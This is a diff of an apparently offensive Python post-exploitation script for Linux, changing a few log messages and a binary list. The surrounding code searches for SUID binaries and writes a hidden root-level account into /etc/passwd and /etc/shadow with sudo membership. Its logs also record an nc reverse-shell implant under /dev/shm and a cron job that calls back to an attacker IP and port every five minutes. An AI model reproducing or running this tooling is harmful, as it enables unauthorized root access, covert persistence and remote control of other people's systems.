@@ -454,7 +454,7 @@ def path():
    "nmap", "openvpn", "perl", "php", "python", "mysql", "rsync", "strings", "systemctl", "unzip", "vim", "wc", "wget", 
    "zsh", "ls", "ftp", "apache2", "apache", "ssh", "ps", "ss", "cat", "touch", "mkdir", "cd", "rm", "nc", "service", 
    "help", "smbclient", "more", "less", "head", "tail", "openssl", "mkpasswd", "pwd", "scp", "python3", "crontab", 
-   "git", "gh", "vi", "nano"]
+   "git", "gh", "vi", "nano", "read"]
 
    os.system("echo '### the following are possible undefined $PATH binary vulnerabilities ###' > /tmp/path_res.txt")
    os.system("find / -type f -perm /4000 2>/dev/null | tee /tmp/path.txt")
@@ -579,9 +579,7 @@ def add_user(username,password):
       os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
       os.system("echo '{}:x:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,username,username))
       os.system("usermod -aG sudo {}".format(username))
-      os.system("useradd -m {}".format(username))
-      os.system("ssh-keygen {} {} {}".format("\n","\n","\n"))
-      print("\n### user {} created and added to sudo group ###".format(username))
+      print("\n### user {} created and added to sudo group ###\n### to be able to ssh into new user, 'su {}' then run 'ssh-keygen' command ###".format(username,username))
       pass_file.close()
    else:
       print("\n*** error: username not specified: use -u to specify username ***")
@@ -622,7 +620,7 @@ def extract(username,password,local_ip,local_port):
 
    # add peristence data to file
    os.system("echo '### persistence established with the following ###' >> /tmp/data_exfil.txt")
-   os.system("echo 'user {}:{} was added with root privileges' >> /tmp/data_exfil.txt".format(username,password))
+   os.system("echo 'user {}:{} was added with root privileges...to be able to ssh into new user, 'su {}' then run 'ssh-keygen' command to create ssh keys' >> /tmp/data_exfil.txt".format(username,password))
    os.system("echo 'nc reverse shell callback implanted at /dev/shm/.data/data_log' >> /tmp/data_exfil.txt")
    os.system("echo 'cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}' >> /tmp/data_exfil.txt".format(local_ip,local_port))
 
